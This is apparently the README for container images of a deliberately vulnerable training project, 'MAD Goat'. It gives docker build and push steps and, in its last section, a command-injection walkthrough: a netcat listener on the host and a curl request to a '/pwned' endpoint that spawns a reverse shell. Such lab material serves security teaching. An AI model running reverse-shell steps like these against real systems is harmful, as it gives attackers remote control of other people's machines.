# mad-goat-images

Custom Container images for MAD Goat Nginix and Python projects

## Docker login to private registry

```bash
docker login -u <username> -p <password> <registry>
```

## Build and push

```bash
docker build -t <registry>/<image>:<tag> .
docker push <registry>/<image>:<tag>
```

### Example with MAD Goat registry

```bash
docker build -t nginix:1.25.3 -f nginix.manual.Dockerfile .
docker tag nginix:1.25.3 ghcr.io/mad-goat-project/nginix:1.25.3
docker push ghcr.io/mad-goat-project/nginix:1.25.3
```

### Install Python project dependencies

```bash
pip install -r requirements.txt
python app.py
```

### To explore the command injection

- Run the container
- On your host machine, run netcat on 8076

```bash
    nc -lvp 8076
```

- Once you have netcat listening, make the follwoing HTTP Get request

```bash
        curl -X GET http://localhost:PORT/pwned?ip=host.docker.internal&port=8076
```

- A reverse shell should be spawned on your host machine
